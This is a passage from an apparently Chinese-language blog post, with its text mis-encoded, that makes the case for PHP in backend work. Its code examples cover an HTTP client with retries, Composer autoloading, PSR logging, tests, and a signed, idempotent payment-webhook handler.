            <span class="hljs-string">'connect_timeout'</span> =&gt; <span class="hljs-number">1.0</span>,
            <span class="hljs-string">'headers'</span> =&gt; [
                <span class="hljs-string">'Authorization'</span> =&gt; <span class="hljs-string">"Bearer <span class="hljs-subst">{$token}</span>"</span>,
                <span class="hljs-string">'Accept'</span> =&gt; <span class="hljs-string">'application/json'</span>,
            ],
        ]);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createLabel</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$payload</span></span>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-variable">$attempts</span> = <span class="hljs-number">0</span>;
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-variable">$attempts</span>++;
            <span class="hljs-keyword">try</span> {
                <span class="hljs-variable">$resp</span> = <span class="hljs-variable language_">$this</span>-&gt;http-&gt;<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-string">'labels'</span>, [<span class="hljs-string">'json'</span> =&gt; <span class="hljs-variable">$payload</span>]);
                <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">json_decode</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$resp</span>-&gt;<span class="hljs-title function_ invoke__">getBody</span>(), <span class="hljs-literal">true</span>);
                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>) ? <span class="hljs-variable">$data</span> : [];
            } <span class="hljs-keyword">catch</span> (GuzzleException <span class="hljs-variable">$e</span>) {
                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$attempts</span> &gt;= <span class="hljs-number">3</span>) {
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">'Shipping API failed after retries'</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$e</span>);
                }
                <span class="hljs-comment">// small exponential backoff + jitter</span>
                <span class="hljs-title function_ invoke__">usleep</span>((<span class="hljs-keyword">int</span>)(<span class="hljs-number">100_000</span> * <span class="hljs-variable">$attempts</span>) + <span class="hljs-title function_ invoke__">random_int</span>(<span class="hljs-number">0</span>, <span class="hljs-number">50_000</span>));
            }
        }
    }
}
</code></pre>
<p>å½“äº’è”ç½‘æœ¬èº«æ˜¯ä½ çš„ä¾èµ–æ—¶ï¼Œè¿™ç§ä»£ç æ˜¯å¿…é¡»çš„â€”â€”è€Œ PHP å¾ˆé€‚åº”è¿™ä¸ªåœºæ™¯ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ˜¯ä¼˜åŠ¿ä¸€</strong>ï¼šPHP å¥‘åˆ HTTP å·¥ä½œçš„å½¢çŠ¶ï¼Œè®©å›¢é˜Ÿèƒ½å¿«é€Ÿæ„å»ºåŠŸèƒ½è€Œä¸ç”¨ä¸å¹³å°å¯¹æŠ—ã€‚</p>
<h3 data-id="heading-7">ä¼˜åŠ¿äºŒï¼šç”Ÿæ€æˆç†Ÿåº¦ï¼ˆComposer + æ¡†æ¶ + æ ‡å‡†é™ä½é£é™©ï¼‰</h3>
<p>PHP çš„ç¬¬äºŒä¸ªä¼˜åŠ¿æ˜¯æ æ†ã€‚</p>
<p>å¾ˆå¤šè¯­è¨€éƒ½èƒ½åš Web å¼€å‘ã€‚ä½†èƒ½è®©"æ— èŠçš„éƒ¨åˆ†"ä»¥å¯å¤ç”¨çš„æ–¹å¼è¢«è§£å†³ã€è®©å›¢é˜Ÿèƒ½æ‹›åˆ°å·²ç»ç†Ÿæ‚‰è¿™äº›æ¨¡å¼çš„äººï¼Œè¿™æ ·çš„æˆç†Ÿç”Ÿæ€å¹¶ä¸å¤šã€‚</p>
<p>å½“ä½ é€‰æ‹© PHPï¼Œä½ é€‰æ‹©çš„ä¸åªæ˜¯è¯­æ³•ï¼Œè¿˜æœ‰ï¼š</p>
<ul>
<li>Composer + Packagist</li>
<li>Laravel / Symfonyï¼ˆä»¥åŠå…¶ä»–æ¡†æ¶ï¼‰</li>
<li>PSR æ ‡å‡†ï¼ˆäº’æ“ä½œæ€§ï¼‰</li>
<li>ç¨³å®šçš„å·¥å…·é“¾ï¼ˆæµ‹è¯•ã€é™æ€åˆ†æã€æ ¼å¼åŒ–ã€é‡æ„ï¼‰</li>
</ul>
<p>ç”Ÿæ€çš„æˆç†Ÿåº¦èƒ½é™ä½é£é™©ã€‚é£é™©æ‰æ˜¯çœŸæ­£èŠ±é’±çš„åœ°æ–¹ã€‚</p>
<h4 data-id="heading-8">Composerï¼šè®©ç»“æ„åŒ–æˆä¸ºå¸¸æ€çš„å®‰é™åŸºçŸ³</h4>
<p>Composer ä¸åªæ˜¯ä¾èµ–ç®¡ç†â€”â€”å®ƒæ¨åŠ¨ä½ èµ°å‘æ¨¡å—åŒ–çš„ä»£ç åº“ï¼Œç”¨è‡ªåŠ¨åŠ è½½å’Œå‘½åç©ºé—´ã€‚</p>
<p>ä¸€ä¸ªæœ€å°çš„ä¾‹å­ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"require"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"php"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^8.2"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"monolog/monolog"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^3.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"guzzlehttp/guzzle"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^7.0"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"autoload"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"psr-4"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"App\\"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"src/"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ä¸€æ—¦ä½ é‡‡ç”¨ PSR-4 è‡ªåŠ¨åŠ è½½ï¼Œä½ çš„ä»£ç å°±ä¸å†æ˜¯"æ–‡ä»¶"ï¼Œè€Œå¼€å§‹å˜æˆ"æ¨¡å—"ã€‚è¿™ä¸ªè½¬å˜æ˜¯ç°ä»£ PHP æ¯”è€åˆ»æ¿å°è±¡æ›´æ˜“ç»´æŠ¤çš„é‡è¦åŸå› ã€‚</p>
<h4 data-id="heading-9">æ¡†æ¶ï¼šç”¨æ— èŠçš„æ–¹æ¡ˆè§£å†³æ— èŠçš„é—®é¢˜ï¼ˆè¿™æ­£æ˜¯é‡ç‚¹ï¼‰</h4>
<p>æ¡†æ¶å¯èƒ½è¢«è¿‡åº¦ä½¿ç”¨ï¼Œä½†"ä¸ç”¨æ¡†æ¶"çš„åšæ³•åœ¨åº”ç”¨å¢é•¿åå¾€å¾€æ›´ç³Ÿã€‚</p>
<p>Laravel å’Œ Symfony ä¸ºä½ ä¸æƒ³é‡æ–°å‘æ˜çš„ä¸œè¥¿æä¾›äº†å¯é çš„é»˜è®¤æ–¹æ¡ˆï¼š</p>
<ul>
<li>è·¯ç”±å’Œä¸­é—´ä»¶</li>
<li>æ ¡éªŒå’Œè¯·æ±‚å¤„ç†</li>
<li>DI å®¹å™¨æ¨¡å¼</li>
<li>ç¼“å­˜å’Œé˜Ÿåˆ—</li>
<li>æ•°æ®åº“è¿ç§»</li>
<li>ç»“æ„åŒ–çš„é”™è¯¯å¤„ç†</li>
</ul>
<p>å¤§å¤šæ•°ç”Ÿäº§äº‹æ•…ä¸æ˜¯æ¥è‡ªç²¾å¦™çš„ä¸šåŠ¡é€»è¾‘ï¼Œè€Œæ˜¯æ¥è‡ªèƒ¶æ°´ä»£ç ï¼šè¶…æ—¶ã€é‡è¯•ã€ä¸ä¸€è‡´çš„æ ¡éªŒã€éƒ¨åˆ†å¤±è´¥ã€æ„å¤–çš„ payloadã€ä¸ä¸€è‡´çš„é”™è¯¯å“åº”ã€‚</p>
<p>æ¡†æ¶é»˜è®¤æ–¹æ¡ˆå‡å°‘è¿™äº›äº‹æ•…ï¼Œå› ä¸ºä½ å»ºç«‹åœ¨å·²ç»ç»å†è¿‡æˆåƒä¸Šä¸‡ä¸ªç”Ÿäº§ç³»ç»Ÿè€ƒéªŒçš„æ¨¡å¼ä¹‹ä¸Šã€‚</p>
<h4 data-id="heading-10">PSR æ ‡å‡†ï¼šè®©ä½ çš„ä»£ç ä¸å†è¢«é”æ­»</h4>
<p>æ ‡å‡†åœ¨ä½ é›†æˆåº“æˆ–è€…è¶…å‡ºæœ€åˆå†³ç­–æ—¶æœ€ä¸ºé‡è¦ã€‚</p>
<p>ä¾‹å¦‚ï¼šPSR-3 æ—¥å¿—ã€‚</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">use</span> <span class="hljs-title">Psr</span>\<span class="hljs-title">Log</span>\<span class="hljs-title">LoggerInterface</span>;
<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BillingService</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> LoggerInterface <span class="hljs-variable">$logger</span></span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">charge</span>(<span class="hljs-params"><span class="hljs-keyword">int</span> <span class="hljs-variable">$userId</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$amountCents</span></span>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;logger-&gt;<span class="hljs-title function_ invoke__">info</span>(<span class="hljs-string">'Charge request'</span>, [
            <span class="hljs-string">'userId'</span> =&gt; <span class="hljs-variable">$userId</span>,
            <span class="hljs-string">'amountCents'</span> =&gt; <span class="hljs-variable">$amountCents</span>,
        ]);
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p>è¿™ä¸ªç±»ä¸åœ¨ä¹ä½ ä»Šå¤©ç”¨ Monolog è¿˜æ˜¯æ˜å¤©æ¢æˆåˆ«çš„æ—¥å¿—åº“ã€‚è¿™ç§è§£è€¦æ‰èƒ½è®©ç³»ç»Ÿæ¼”è¿›ã€‚</p>
<h4 data-id="heading-11">å·¥å…·é“¾ï¼šå’Œ 2015 å¹´ç›¸æ¯”ï¼Œç°ä»£ PHP åƒæ¢äº†ä¸€é—¨è¯­è¨€</h4>
<p>å¾ˆå¤š"PHP é»‘"æ¥è‡ªäºå¯¹è€ä»£ç åº“çš„ä½“éªŒï¼šå¼±ç±»å‹ã€ä¸ä¸€è‡´çš„æ¨¡å¼ã€"å…ˆä¸Šçº¿å†è¯´"çš„æ–‡åŒ–ã€‚</p>
<p>ç°ä»£ PHP å›¢é˜Ÿé€šå¸¸ä¼šç”¨ä¸€å¥—ç®€å•çš„è´¨é‡å·¥å…·é“¾ï¼š</p>
<ul>
<li>ä¸¥æ ¼ç±»å‹</li>
<li>é™æ€åˆ†æï¼ˆPHPStan / Psalmï¼‰</li>
<li>æµ‹è¯•ï¼ˆPHPUnit / Pestï¼‰</li>
<li>æ ¼å¼åŒ–ï¼ˆPHP-CS-Fixerï¼‰</li>
<li>è‡ªåŠ¨é‡æ„ï¼ˆRectorï¼‰</li>
</ul>
<p>è¿™å¥—ç»„åˆä¼šæ”¹å˜ä½ å†™ä»£ç çš„æ–¹å¼ã€‚ç›®æ ‡ä¸æ˜¯å®Œç¾ï¼Œè€Œæ˜¯å°½æ—©æš´éœ²é—®é¢˜ï¼Œè®©ä»£ç åœ¨è¿­ä»£ä¸­ä¿æŒå¯è¯»ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªå°ä¾‹å­ï¼Œé™æ€åˆ†æå¸®ä½ é¿å…ä¸€ä¸ªè¿è¡Œæ—¶ bugï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserRepository</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">findByEmail</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$email</span></span>): <span class="hljs-title">User</span>
    </span>{
        <span class="hljs-comment">// DB lookup...</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// bug</span>
    }
}
</code></pre>
<p>é…ç½®å¥½é™æ€åˆ†æåï¼Œè¿™ä¼šç«‹å³è¢«æ ‡è®°å‡ºæ¥ã€‚</p>
<p>PHP çš„æµ‹è¯•ä¹Ÿä¸å¿…å¾ˆé‡ã€‚ä¸€ä¸ªèšç„¦çš„æµ‹è¯•å¯ä»¥è¯»èµ·æ¥åƒæ–‡æ¡£ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MoneyTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">TestCase</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testItAddsMoneyInSameCurrency</span>(<span class="hljs-params"/>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable">$a</span> = <span class="hljs-title class_">Money</span>::<span class="hljs-title function_ invoke__">usd</span>(<span class="hljs-number">1000</span>);
        <span class="hljs-variable">$b</span> = <span class="hljs-title class_">Money</span>::<span class="hljs-title function_ invoke__">usd</span>(<span class="hljs-number">250</span>);
        <span class="hljs-variable">$sum</span> = <span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-variable">$b</span>);
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">assertSame</span>(<span class="hljs-number">1250</span>, <span class="hljs-variable">$sum</span>-&gt;<span class="hljs-title function_ invoke__">cents</span>());
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">assertSame</span>(<span class="hljs-string">'USD'</span>, <span class="hljs-variable">$sum</span>-&gt;<span class="hljs-title function_ invoke__">currency</span>());
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ˜¯ä¼˜åŠ¿äºŒ</strong>ï¼šPHP çš„ç”Ÿæ€è®©ä½ èƒ½å¿«é€Ÿäº¤ä»˜å¹¶å®‰å…¨æ„å»ºï¼Œå› ä¸ºå·¥å…·é“¾å’Œæƒ¯ä¾‹éƒ½å·²æˆç†Ÿã€‚</p>
<h3 data-id="heading-12">ä¼˜åŠ¿ä¸‰ï¼šåŠ¡å®çš„æ•°æ®ç®¡é“ï¼ˆPHP æ“…é•¿"ä¹±è¿›ã€å¹²å‡€å‡º"ï¼‰</h3>
<p>å¦‚æœä½ åšè¿‡ä¸€æ®µæ—¶é—´åç«¯ï¼Œä½ å°±çŸ¥é“çœŸç›¸ï¼šè¿™ä»½å·¥ä½œå°±æ˜¯æ•°æ®è½¬æ¢ã€‚</p>
<p>è¯·æ±‚è¿›æ¥æ ¼å¼å¥‡æ€ªã€‚æ•°æ®åº“è¡Œå–å‡ºæ¥æ ¼å¼å¥‡æ€ªã€‚å¤–éƒ¨ API è¿”å›çš„æ˜¯"å·®ä¸å¤šæ˜¯ä½ æœŸæœ›çš„"ã€‚Webhook åœ¨ä¸æ–¹ä¾¿çš„æ—¶å€™é‡è¯•ã€‚è¾¹ç¼˜æƒ…å†µåœ¨å‘¨äº”å‘ç”Ÿã€‚</p>
<p>PHP åœ¨è¿™ç±»å·¥ä½œä¸Šç‰¹åˆ«å¼ºï¼Œå› ä¸ºå®ƒåœ¨ä¸¤ç§æ¨¡å¼ä¸‹éƒ½å¾ˆè‡ªå¦‚ï¼š</p>
<ul>
<li>å¿«é€Ÿæ“ä½œï¼ˆå­—ç¬¦ä¸²ã€æ•°ç»„ã€JSONï¼‰</li>
<li>ç»“æ„åŒ–ä»£ç ï¼ˆDTOã€å€¼å¯¹è±¡ã€æšä¸¾ã€readonly å±æ€§ï¼‰</li>
</ul>
<p>ä¸ºäº†è¯´æ˜æˆ‘çš„æ„æ€ï¼Œæ¥æ„å»ºä¸€ä¸ªç°å®çš„ç®¡é“ï¼šå¤„ç†æ¥è‡ªæ”¯ä»˜æä¾›å•†çš„ webhookã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æµ‹è¯•ï¼Œå› ä¸ºå®ƒç»“åˆäº†ï¼š</p>
<ul>
<li>å®‰å…¨éªŒè¯</li>
<li>å¹‚ç­‰æ€§ï¼ˆé‡è¯•ï¼‰</li>
<li>è½½è·è§„èŒƒåŒ–</li>
<li>çŠ¶æ€å˜æ›´</li>
<li>ä¼˜é›…å¤„ç†æœªçŸ¥äº‹ä»¶ç±»å‹</li>
</ul>
<h4 data-id="heading-13">æ­¥éª¤ä¸€ï¼šä¿æŒè½½è·è¾¹ç•Œæ˜¾å¼åŒ–ï¼ˆDTO ä¼˜äºåŸå§‹æ•°ç»„ï¼‰</h4>
<p>æ•°ç»„åœ¨è¾¹ç•Œå¤„æ²¡é—®é¢˜ï¼Œä½†åœ¨æ•´ä¸ªåº”ç”¨ä¸­ä¼ é€’åŸå§‹æ•°ç»„ä¼šå˜å¾—ç—›è‹¦ã€‚æ‰€ä»¥ï¼šå°½æ—©è§£æï¼Œå°½æ—©ç»“æ„åŒ–ã€‚</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebhookEvent</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$id</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$type</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$createdAtEpoch</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span>
    </span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fromArray</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$payload</span></span>): <span class="hljs-title">self</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">self</span>(
            id: (<span class="hljs-keyword">string</span>)(<span class="hljs-variable">$payload</span>[<span class="hljs-string">'id'</span>] ?? <span class="hljs-string">''</span>),
            type: (<span class="hljs-keyword">string</span>)(<span class="hljs-variable">$payload</span>[<span class="hljs-string">'type'</span>] ?? <span class="hljs-string">''</span>),
            createdAtEpoch: (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$payload</span>[<span class="hljs-string">'created_at'</span>] ?? <span class="hljs-number">0</span>),
            data: <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-string">'data'</span>] ?? <span class="hljs-literal">null</span>) ? <span class="hljs-variable">$payload</span>[<span class="hljs-string">'data'</span>] : []
        );
    }
}
</code></pre>
<p>è¿™æ˜¯åŠ¡å®çš„åšæ³•ï¼šæˆ‘ä»¬ä¾èµ–çš„å­—æ®µç”¨å¼ºç±»å‹ï¼ŒåŸå§‹æ•°æ®ç•™ç€çµæ´»æ€§ï¼Œæ–°å­—æ®µåŠ è¿›æ¥ä¹Ÿä¸ä¼šç‚¸ã€‚</p>
<h4 data-id="heading-14">æ­¥éª¤äºŒï¼šéªŒè¯ç­¾åï¼ˆä¸è¦"ä¿¡ä»» JSON"ï¼‰</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebhookSignatureVerifier</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$secret</span></span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$rawBody</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$signatureHeader</span></span>): <span class="hljs-title">bool</span>
    </span>{
        <span class="hljs-variable">$expected</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">'sha256'</span>, <span class="hljs-variable">$rawBody</span>, <span class="hljs-variable">$this</span>-&gt;secret);
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">hash_equals</span>(<span class="hljs-variable">$expected</span>, <span class="hljs-variable">$signatureHeader</span>);
    }
}
</code></pre>
<p>è¿™é‡Œ <code>hash_equals</code> å¾ˆé‡è¦ï¼Œç”¨äºé¿å…æ—¶åºæ”»å‡»ã€‚è¿™æ˜¯ä¸ªå°ç»†èŠ‚ï¼Œä½†è¿™ç±»ä¹ æƒ¯æ­£æ˜¯åŒºåˆ†ä¸šä½™ä»£ç å’Œç”Ÿäº§ä»£ç çš„åœ°æ–¹ã€‚</p>
<h4 data-id="heading-15">æ­¥éª¤ä¸‰ï¼šå¹‚ç­‰æ€§ï¼ˆå› ä¸º webhook ä¼šé‡è¯•ï¼‰</h4>
<p>å¦‚æœä½ å¤„ç†åŒä¸€ä¸ªäº‹ä»¶ä¸¤æ¬¡ï¼Œä½ å¯èƒ½ä¼šï¼š</p>
<ul>
<li>é‡å¤æ›´æ–°è®¢é˜…</li>
<li>é‡å¤å‘é€é‚®ä»¶</li>
<li>é‡å¤ç»™è´¦æˆ·åŠ æ¬¾</li>
</ul>
<p>æ‰€ä»¥è¦å­˜å‚¨å·²å¤„ç†çš„äº‹ä»¶ IDã€‚</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebhookIdempotencyStore</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> PDO <span class="hljs-variable">$pdo</span></span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hasProcessed</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$eventId</span></span>): <span class="hljs-title">bool</span>
    </span>{
        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;pdo-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">"SELECT 1 FROM processed_webhooks WHERE event_id = :id"</span>);
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-string">':id'</span> =&gt; <span class="hljs-variable">$eventId</span>]);
        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">bool</span>)<span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetchColumn</span>();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">markProcessed</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$eventId</span></span>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;pdo-&gt;<span class="hljs-title function_ invoke__">prepare</span>(
            <span class="hljs-string">"INSERT INTO processed_webhooks (event_id, processed_at)
             VALUES (:id, NOW())"</span>
        );
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-string">':id'</span> =&gt; <span class="hljs-variable">$eventId</span>]);
    }
}
</code></pre>
<h4 data-id="heading-16">æ­¥éª¤å››ï¼šå¹²å‡€åœ°æ˜ å°„äº‹ä»¶ç±»å‹ï¼ˆæšä¸¾å¾ˆæœ‰å¸®åŠ©ï¼‰</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">PaymentEventType</span>: <span class="hljs-title">string</span>
</span>{
    <span class="hljs-keyword">case</span> PaymentSucceeded = <span class="hljs-string">'payment.succeeded'</span>;
    <span class="hljs-keyword">case</span> PaymentFailed = <span class="hljs-string">'payment.failed'</span>;
}
</code></pre>
<h4 data-id="heading-17">æ­¥éª¤äº”ï¼šç”¨äº‹åŠ¡å‹ handler æŠŠå®ƒä»¬ç»„åˆèµ·æ¥</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PaymentWebhookHandler</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> WebhookSignatureVerifier <span class="hljs-variable">$verifier</span>,
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> WebhookIdempotencyStore <span class="hljs-variable">$idem</span>,
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> PaymentService <span class="hljs-variable">$payments</span>,
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> PDO <span class="hljs-variable">$pdo</span>
    </span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$rawBody</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$signatureHeader</span></span>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;verifier-&gt;<span class="hljs-title function_ invoke__">verify</span>(<span class="hljs-variable">$rawBody</span>, <span class="hljs-variable">$signatureHeader</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">'Invalid webhook signature'</span>);
        }
        <span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$rawBody</span>, <span class="hljs-literal">true</span>);
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$payload</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">'Invalid JSON'</span>);
        }
        <span class="hljs-variable">$event</span> = <span class="hljs-title class_">WebhookEvent</span>::<span class="hljs-title function_ invoke__">fromArray</span>(<span class="hljs-variable">$payload</span>);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$event</span>-&gt;id === <span class="hljs-string">''</span> || <span class="hljs-variable">$event</span>-&gt;type === <span class="hljs-string">''</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">'Missing event fields'</span>);
        }
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;idem-&gt;<span class="hljs-title function_ invoke__">hasProcessed</span>(<span class="hljs-variable">$event</span>-&gt;id)) {
            <span class="hljs-keyword">return</span>; <span class="hljs-comment">// safe no-op</span>
        }
        <span class="hljs-variable language_">$this</span>-&gt;pdo-&gt;<span class="hljs-title function_ invoke__">beginTransaction</span>();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">dispatch</span>(<span class="hljs-variable">$event</span>);
            <span class="hljs-variable language_">$this</span>-&gt;idem-&gt;<span class="hljs-title function_ invoke__">markProcessed</span>(<span class="hljs-variable">$event</span>-&gt;id);
            <span class="hljs-variable language_">$this</span>-&gt;pdo-&gt;<span class="hljs-title function_ invoke__">commit</span>();
        } <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span>) {
            <span class="hljs-variable language_">$this</span>-&gt;pdo-&gt;<span class="hljs-title function_ invoke__">rollBack</span>();
            <span class="hljs-keyword">throw</span> <span class="hljs-variable">$e</span>;
        }
    }
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dispatch</span>(<span class="hljs-params">WebhookEvent <span class="hljs-variable">$event</span></span>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable">$type</span> = <span class="hljs-title class_">PaymentEventType</span>::<span class="hljs-title function_ invoke__">tryFrom</span>(<span class="hljs-variable">$event</span>-&gt;type);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$type</span> === <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// unknown event type: ignore or log</span>
            <span class="hljs-keyword">return</span>;
